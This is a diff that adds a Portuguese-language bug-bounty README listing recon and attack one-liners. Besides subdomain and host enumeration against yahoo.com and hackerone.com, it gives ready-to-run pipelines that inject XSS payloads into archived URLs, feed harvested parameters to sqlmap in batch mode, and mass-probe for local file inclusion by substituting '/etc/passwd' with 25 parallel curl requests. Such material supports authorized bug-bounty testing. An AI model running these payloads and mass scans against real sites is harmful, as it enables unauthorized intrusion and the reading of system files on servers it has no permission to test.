@@ -1,0 +1,46 @@
+<h1 id="liners_bounty">Liners_bounty</h1>
+<p>UMA SÉRIE DE ONELINERS PARA BUG BOUNTY</p>
+<p><a href="https://ei7hacker.blogspot.com/">Blog do Eike</a></p>
+<p><a href="https://github.com/projectdiscovery/httpx">HTTPX</a></p>
+<p><a
+href="https://github.com/projectdiscovery/subfinder">SUBFINDER</a></p>
+<p><a href="https://github.com/tomnomnom/httprobe">HTTPROBE</a></p>
+<p><a
+href="https://github.com/tomnomnom/assetfinder">ASSETFINDER</a></p>
+<p><a href="https://github.com/tomnomnom/anew">ANEW</a></p>
+<p><a
+href="https://github.com/tomnomnom/waybackurls">waybackurls</a></p>
+<p><a href="https://github.com/takshal/freq">FREQ</a></p>
+<p><a href="https://github.com/ferreiraklet/airixss">AIRIXSS</a></p>
+<p><a href="https://github.com/tomnomnom/gf">GF</a></p>
+<h3 id="subdominios">subdominios</h3>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">subfinder</span> <span class="at">-d</span> yahoo.com <span class="at">-o</span> domains <span class="kw">;</span> <span class="bu">echo</span> <span class="st">&quot;yahoo.com&quot;</span> <span class="kw">|</span> <span class="ex">assetfinder</span> <span class="kw">|</span> <span class="fu">tee</span> <span class="at">-a</span> domains <span class="kw">;</span> <span class="bu">wait</span> <span class="kw">;</span> <span class="fu">cat</span> domains <span class="kw">|</span> <span class="ex">anew</span> subs</span></code></pre></div>
+<h3 id="hosts">hosts</h3>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">subfinder</span> <span class="at">-d</span> hackerone.com <span class="kw">|</span> <span class="ex">httpx</span>  <span class="at">-o</span> hosts</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;hackerone.com&quot;</span> <span class="kw">|</span> <span class="ex">assetfinder</span> <span class="kw">|</span> <span class="ex">httprobe</span> <span class="kw">|</span> <span class="fu">tee</span> <span class="at">-a</span> hosts</span></code></pre></div>
+<h3 id="status-code">status-code</h3>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">subfinder-d</span> yahoo.com <span class="kw">|</span> <span class="ex">httpx</span> <span class="at">-status-code</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">subfinder-d</span> yahoo.com <span class="kw">|</span> <span class="ex">httpx</span> <span class="at">-status-code</span> <span class="at">-mc</span> 200</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">subfinder-d</span> yahoo.com <span class="kw">|</span> <span class="ex">httpx</span> <span class="at">-status-code</span> <span class="at">-mc</span> 300</span></code></pre></div>
+<h3 id="find-xss-with-freq-and-qsreplace">FIND XSS WITH FREQ AND
+QSREPLACE</h3>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;exemplo.com&quot;</span> <span class="kw">|</span> <span class="ex">waybackurls</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;=&quot;</span> <span class="kw">|</span> <span class="ex">qsreplace</span> <span class="st">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span> <span class="kw">|</span> <span class="ex">freq</span> </span></code></pre></div>
+<h3 id="find-with-airixss">FIND WITH AIRIXSS</h3>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;exemplo.com&quot;</span> <span class="kw">|</span> <span class="ex">waybackurls</span> <span class="kw">|</span> <span class="ex">gf</span> xss <span class="kw">|</span> <span class="ex">qsreplace</span> <span class="st">&quot;&lt;svg onload=alert(1)&gt;&quot;</span> <span class="kw">|</span> <span class="ex">Airixss</span> <span class="at">-payload</span> <span class="st">&quot;alert(1)&quot;</span> <span class="kw">|</span> <span class="fu">egrep</span> <span class="at">-v</span> <span class="st">&quot;Not&quot;</span></span></code></pre></div>
+<h3 id="find-massive-sqli">FIND MASSIVE SQLI</h3>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">waybackurls</span> http://testphp.vulnweb.com <span class="kw">|</span> <span class="ex">gf</span> sqli <span class="kw">|</span> <span class="fu">tee</span> <span class="at">-a</span> sqli.txt <span class="kw">;</span> <span class="bu">wait</span> <span class="kw">;</span> <span class="ex">sqlmap</span> <span class="at">-m</span> sqli.txt <span class="at">--batch</span> <span class="at">--random-agent</span> <span class="at">--level</span> 1</span></code></pre></div>
+<h3 id="find-lfi-with-gau">FIND LFI WITH GAU</h3>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">gau</span> HOST <span class="kw">|</span> <span class="ex">gf</span> lfi <span class="kw">|</span> <span class="ex">qsreplace</span> <span class="st">&quot;/etc/passwd&quot;</span> <span class="kw">|</span> <span class="fu">xargs</span> <span class="at">-I%</span> <span class="at">-P</span> 25 sh <span class="at">-c</span> <span class="st">&#39;curl -s &quot;%&quot; 2&gt;&amp;1 | grep -q &quot;root:x&quot; &amp;&amp; echo &quot;VULN! %&quot;&#39;</span></span></code></pre></div>
+<h3 id="find-endpoint-in-js">FIND ENDPOINT IN JS</h3>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> FILE.js <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-oh</span> <span class="st">&quot;</span><span class="dt">\&quot;</span><span class="st">\/[a-zA-Z0-9_/?=&amp;]*</span><span class="dt">\&quot;</span><span class="st">&quot;</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="at">-e</span> <span class="st">&#39;s/^&quot;//&#39;</span> <span class="at">-e</span> <span class="st">&#39;s/&quot;$//&#39;</span> <span class="kw">|</span> <span class="fu">sort</span> <span class="at">-u</span></span></code></pre></div>
